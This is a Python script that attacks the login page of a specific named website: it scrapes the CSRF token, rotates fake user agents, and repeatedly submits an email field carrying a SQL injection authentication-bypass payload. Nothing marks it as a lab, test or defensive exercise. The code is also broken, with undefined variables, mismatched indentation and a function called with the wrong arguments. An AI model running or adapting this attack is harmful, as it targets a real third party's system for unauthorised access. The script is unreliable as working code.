import requests
import random
from bs4 import BeautifulSoup
from fake_useragent import UserAgent

# Function to generate random numbers
def generate_random_numbers():
    return ''.join(str(random.randint(0, 9)) for _ in range(3))

# Function to visit the invite URL
def visit_invite_url(session, headers, referred_code):
    url = 'https://saralshikshya.com.np/login'
    try:
        response = session.get(url, headers=headers)
        response.raise_for_status()  # Raise an exception for non-2xx status codes
        print("Accepted.")
    except requests.exceptions.RequestException as e:
        print(f"Failed to visit invite URL: {e}")

# Function to get token and payloads from server
def get_token_and_payloads(session, headers):
    url = 'https://saralshikshya.com.np/loginr'
    try:
        response = session.get(url, headers=headers)
        response.raise_for_status()  # Raise an exception for non-2xx status codes
        soup = BeautifulSoup(response.content, 'html.parser')
        token = soup.find('input', {'name': '_token'}).get('value')
        payloads = soup.find_all('input')
        return token, payloads
    except requests.exceptions.RequestException as e:
        print(f"Failed to get token and payloads: {e}")
        return None, None

# Function to submit form
def submit_form(_token, session, email, password, payloads, headers):
    url = 'https://saralshikshya.com.np/login'
    data = {
        '_token': _token,
        'email': email,
        'password': password,
      'remember': remember
    }
    try:
        response = session.post(url, data=data, headers=headers)
        if 'https://saralshikshya.com.np/myprofile' in response.url:
            print("Login successful.")
            print("Email:", email)
        else:
            print("Login failed.")
    except Exception as e:
        print("An error occurred:", e)

def main():
    ua = UserAgent()
    
    # Generate 1000 random user agents
    user_agents = [ua.random for _ in range(1000)]
    
    with requests.Session() as session:
        headers = {"User-Agent": random.choice(user_agents)}
        
        # Visit invite URL first
        visit_invite_url(session, headers, referred_code)
        
        # Get token and payloads after visiting invite URL
        _token, payloads = get_token_and_payloads(session, headers)
        
        # Proceed with form submission if token and payloads are obtained
        if _token and payloads:
            for _ in range(10):  # Loop 5 times for testing, you can increase this number
                email = f"itsmehacker062@mail.com' OR '1'='1' --"
              remember = "on"
                password = 'ramdev@123450'  # Change to your desired password
                submit_form(_token, session, 'post', email, password, payloads, headers)

if __name__ == "__main__":
    main()
